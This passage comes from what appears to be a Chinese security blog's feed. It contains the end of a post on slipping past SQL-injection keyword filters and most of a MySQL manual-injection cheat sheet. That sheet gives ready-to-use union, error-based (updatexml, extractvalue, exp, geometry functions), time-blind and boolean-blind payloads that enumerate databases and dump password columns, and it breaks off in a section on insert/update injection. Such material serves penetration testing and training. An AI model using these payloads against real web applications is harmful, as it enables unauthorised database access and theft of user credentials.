class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit<br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union|where|limit)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> user_id <span class="hljs-keyword">having</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>#user_id聚合中user_id为<span class="hljs-number">1</span>的<span class="hljs-keyword">user</span>为admin<br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit, <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union|where|limit|group by)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> user_id <span class="hljs-keyword">having</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> substr(group_concat(user_id),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users ) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit, <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>, <span class="hljs-keyword">select</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union|where|limit|group by|select)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> substr(gruop_concat(user_id),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span><br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit, <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>, <span class="hljs-keyword">select</span>, <span class="hljs-string">&#x27;</span><br><span class="hljs-string">php代码    preg_match(&#x27;</span><span class="hljs-operator">/</span>(<span class="hljs-keyword">and</span><span class="hljs-operator">|</span><span class="hljs-keyword">or</span><span class="hljs-operator">|</span><span class="hljs-keyword">union</span><span class="hljs-operator">|</span><span class="hljs-keyword">where</span><span class="hljs-operator">|</span>limit<span class="hljs-operator">|</span><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><span class="hljs-operator">|</span><span class="hljs-keyword">select</span><span class="hljs-operator">|</span>\<span class="hljs-string">&#x27;)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> substr(gruop_concat(user_id),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> user_id <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x61</span> <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> unhex(<span class="hljs-number">61</span>)<br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit, <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>, <span class="hljs-keyword">select</span>, <span class="hljs-string">&#x27;, hex</span><br><span class="hljs-string">php代码    preg_match(&#x27;</span><span class="hljs-operator">/</span>(<span class="hljs-keyword">and</span><span class="hljs-operator">|</span><span class="hljs-keyword">or</span><span class="hljs-operator">|</span><span class="hljs-keyword">union</span><span class="hljs-operator">|</span><span class="hljs-keyword">where</span><span class="hljs-operator">|</span>limit<span class="hljs-operator">|</span><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><span class="hljs-operator">|</span><span class="hljs-keyword">select</span><span class="hljs-operator">|</span>\<span class="hljs-string">&#x27;|hex)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> unhex(<span class="hljs-number">61</span>)<br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-built_in">lower</span>(conv(<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">16</span>)) #十进制的<span class="hljs-number">11</span>转化为十六进制，并小写。<br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit, <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>, <span class="hljs-keyword">select</span>, <span class="hljs-string">&#x27;, hex, substr</span><br><span class="hljs-string">php代码    preg_match(&#x27;</span><span class="hljs-operator">/</span>(<span class="hljs-keyword">and</span><span class="hljs-operator">|</span><span class="hljs-keyword">or</span><span class="hljs-operator">|</span><span class="hljs-keyword">union</span><span class="hljs-operator">|</span><span class="hljs-keyword">where</span><span class="hljs-operator">|</span>limit<span class="hljs-operator">|</span><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><span class="hljs-operator">|</span><span class="hljs-keyword">select</span><span class="hljs-operator">|</span>\<span class="hljs-string">&#x27;|hex|substr)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-built_in">lower</span>(conv(<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">16</span>))<span class="hljs-operator">/</span>td<span class="hljs-operator">&gt;</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> lpad(<span class="hljs-keyword">user</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>)<br><br>过滤关键字    <span class="hljs-keyword">and</span>, <span class="hljs-keyword">or</span>, <span class="hljs-keyword">union</span>, <span class="hljs-keyword">where</span>, limit, <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>, <span class="hljs-keyword">select</span>, <span class="hljs-string">&#x27;, hex, substr, 空格</span><br><span class="hljs-string">php代码    preg_match(&#x27;</span><span class="hljs-operator">/</span>(<span class="hljs-keyword">and</span><span class="hljs-operator">|</span><span class="hljs-keyword">or</span><span class="hljs-operator">|</span><span class="hljs-keyword">union</span><span class="hljs-operator">|</span><span class="hljs-keyword">where</span><span class="hljs-operator">|</span>limit<span class="hljs-operator">|</span><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><span class="hljs-operator">|</span><span class="hljs-keyword">select</span><span class="hljs-operator">|</span>\<span class="hljs-string">&#x27;|hex|substr|\s)/i&#x27;</span>, $id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> lpad(<span class="hljs-keyword">user</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">/</span>td<span class="hljs-operator">&gt;</span><br>绕过方式    <span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>b<span class="hljs-operator">||</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>blpad(<span class="hljs-keyword">user</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>)<br><br>过滤关键字    <span class="hljs-keyword">and</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">where</span><br>php代码    preg_match(<span class="hljs-string">&#x27;/(and|or|union|where)/i&#x27;</span>,$id)<br>会过滤的攻击代码    <span class="hljs-number">1</span> <span class="hljs-operator">||</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br>绕过方式    <span class="hljs-number">1</span> <span class="hljs-operator">||</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure><p>节选自：<a href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>WAF绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql备忘录</title>
    <link href="/2022/06/16/sql%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2022/06/16/sql%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-Mysql-手工注入"><a href="#0x01-Mysql-手工注入" class="headerlink" title="0x01 Mysql 手工注入"></a>0x01 Mysql 手工注入</h2><h3 id="1-1-联合注入"><a href="#1-1-联合注入" class="headerlink" title="1.1 联合注入"></a>1.1 联合注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 4--+</span><br><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,database()<span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot; <span class="hljs-comment">--+</span><br>#group_concat(column_name) 可替换为 unhex(Hex(<span class="hljs-built_in">cast</span>(column_name<span class="hljs-operator">+</span><span class="hljs-keyword">as</span><span class="hljs-operator">+</span><span class="hljs-type">char</span>)))column_name<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3,group_concat(password) from users --+</span><br><span class="hljs-string">#group_concat 可替换为 concat_ws(&#x27;</span>,<span class="hljs-string">&#x27;,id,users,password )</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="1-2-报错注入"><a href="#1-2-报错注入" class="headerlink" title="1.2 报错注入"></a>1.2 报错注入</h3><h4 id="1-floor"><a href="#1-floor" class="headerlink" title="1.floor()"></a>1.floor()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-keyword">user</span>(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a);<br></code></pre></td></tr></table></figure><h4 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a>2.extractvalue()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)));<br></code></pre></td></tr></table></figure><h4 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3.updatexml()"></a>3.updatexml()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><h4 id="4-geometrycollection-（5-1-version"><a href="#4-geometrycollection-（5-1-version" class="headerlink" title="4.geometrycollection()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>4.geometrycollection()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> geometrycollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> database())a)b));<br></code></pre></td></tr></table></figure><h4 id="5-multipoint-（5-1-version"><a href="#5-multipoint-（5-1-version" class="headerlink" title="5.multipoint()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>5.multipoint()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h4 id="6-polygon-（5-1-version"><a href="#6-polygon-（5-1-version" class="headerlink" title="6.polygon()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>6.polygon()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h4 id="7-multipolygon-（5-1-version"><a href="#7-multipolygon-（5-1-version" class="headerlink" title="7.multipolygon()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>7.multipolygon()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h4 id="8-linestring-（5-1-version"><a href="#8-linestring-（5-1-version" class="headerlink" title="8.linestring()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>8.linestring()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> linestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h4 id="9-multilinestring-（5-1-version"><a href="#9-multilinestring-（5-1-version" class="headerlink" title="9.multilinestring()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>9.multilinestring()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h4 id="10-exp-（5-1-version"><a href="#10-exp-（5-1-version" class="headerlink" title="10.exp()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）"></a>10.exp()（5.1&gt;&#x3D;version&lt;&#x3D;5.5.48 ）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));<br></code></pre></td></tr></table></figure><h4 id="11-NAME-CONST"><a href="#11-NAME-CONST" class="headerlink" title="11.NAME_CONST()"></a>11.NAME_CONST()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> name_const(@<span class="hljs-variable">@version</span>,<span class="hljs-number">0</span>))a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> name_const(@<span class="hljs-variable">@version</span>,<span class="hljs-number">0</span>))b)c);<br></code></pre></td></tr></table></figure><h4 id="12-join"><a href="#12-join" class="headerlink" title="12.join"></a>12.join</h4><p><code>select * from(select * from mysql.user a join mysql.user b)c;</code></p><h4 id="13-ST-LatFromGeoHash-（-5-7）"><a href="#13-ST-LatFromGeoHash-（-5-7）" class="headerlink" title="13.ST_LatFromGeoHash()（&gt;&#x3D;5.7）"></a>13.ST_LatFromGeoHash()（&gt;&#x3D;5.7）</h4><p><code>select ST_LatFromGeoHash(user());</code></p><h4 id="14-ST-LongFromGeoHash-（-5-7）"><a href="#14-ST-LongFromGeoHash-（-5-7）" class="headerlink" title="14.ST_LongFromGeoHash()（&gt;&#x3D;5.7）"></a>14.ST_LongFromGeoHash()（&gt;&#x3D;5.7）</h4><p><code>select ST_LongFromGeoHash(user());</code></p><h4 id="15-GTID-SUBSET-（-5-7）"><a href="#15-GTID-SUBSET-（-5-7）" class="headerlink" title="15.GTID_SUBSET()（&gt;&#x3D;5.7）"></a>15.GTID_SUBSET()（&gt;&#x3D;5.7）</h4><p><code>select GTID_SUBSET(user(),1);</code></p><h4 id="16-GTID-SUBTRACT-（-5-7）"><a href="#16-GTID-SUBTRACT-（-5-7）" class="headerlink" title="16.GTID_SUBTRACT()（&gt;&#x3D;5.7）"></a>16.GTID_SUBTRACT()（&gt;&#x3D;5.7）</h4><p><code>select GTID_SUBTRACT(user(),1);</code></p><h4 id="17-ST-PointFromGeoHash-（-5-7）"><a href="#17-ST-PointFromGeoHash-（-5-7）" class="headerlink" title="17.ST_PointFromGeoHash()（&gt;&#x3D;5.7）"></a>17.ST_PointFromGeoHash()（&gt;&#x3D;5.7）</h4><p><code>select ST_PointFromGeoHash(user(),1);</code></p><h4 id="18-procedure-analyse-（"><a href="#18-procedure-analyse-（" class="headerlink" title="18.procedure analyse()（*&lt;&#x3D;5.6.17）"></a>18.procedure analyse()（*&lt;&#x3D;5.6.17）</h4><p><code>procedure analyse(extractvalue(1,concat(0x3a,user())),1)；</code> 放在语句末尾</p><p>每个一个报错语句都有它的原理：</p><p>exp() 报错的原理：exp 是一个数学函数，取e的x次方，当我们输入的值大于709就会报错，然后 ~ 取反它的值总会大于709，所以报错。</p><p>updatexml() 报错的原理：由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p><p>爆库：<code>?id=1&#39; and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +</code><br>爆表：<code>?id=1&#39; and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1) -- +</code><br>爆字段：<code>?id=1&#39; and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +</code><br>爆数据：<code>?id=1&#39; and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +</code></p><p>#concat 也可以放在外面 <code>updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)</code></p><p>这里需要注意的是它加了连接字符，导致数据中的 md5 只能爆出 31 位，这里可以用分割函数分割出来：<br><code>substr(string string,num start,num length);</code><br>#string为字符串,start为起始位置,length为长度<br><code>?id=1&#39; and updatexml(1,concat(0x7e, substr((select password from users limit 1,1),1,16),0x7e),1) -- +</code></p><h3 id="1-3-盲注"><a href="#1-3-盲注" class="headerlink" title="1.3 盲注"></a>1.3 盲注</h3><h4 id="1-3-1-时间盲注"><a href="#1-3-1-时间盲注" class="headerlink" title="1.3.1 时间盲注"></a>1.3.1 时间盲注</h4><p>时间盲注也叫延时注入 一般用到函数 sleep() BENCHMARK() 还可以使用笛卡尔积(尽量不要使用,内容太多会很慢很慢)</p><p>一般时间盲注我们还需要使用条件判断函数</p><p>#if（expre1，expre2，expre3）<br>当 expre1 为 true 时，返回 expre2，false 时，返回 expre3</p><p>#盲注的同时也配合着 mysql 提供的分割函数<br>substr、substring、left<br>我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号，常用到的就有 ascii() hex() 等等</p><p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))–+<br>?id&#x3D;1’ and if((substr((select user()),1,1)&#x3D;’r’),sleep(5),1)–+</p><h4 id="1-3-2-布尔盲注"><a href="#1-3-2-布尔盲注" class="headerlink" title="1.3.2 布尔盲注"></a>1.3.2 布尔盲注</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select user()),1,1)=&#x27;</span>r<span class="hljs-string">&#x27; -- +</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> IFNULL((substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;r&#x27;</span>),<span class="hljs-number">0</span>) <span class="hljs-comment">-- +</span><br></code></pre></td></tr></table></figure><p>#如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and strcmp((substr((select user()),1,1)=&#x27;</span>r<span class="hljs-string">&#x27;),1) -- +</span><br></code></pre></td></tr></table></figure><p>#若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 1</p><h3 id="1-4-insert-delete-update"><a href="#1-4-insert-delete-update" class="headerlink" title="1.4 insert,delete,update"></a>1.4 insert,delete,update</h3><p>insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般较难发现，我们可以尝试性插入、引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入</p><h4 id="1-4-1-报错"><a href="#1-4-1-报错" class="headerlink" title="1.4.1 报错"></a>1.4.1 报错</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 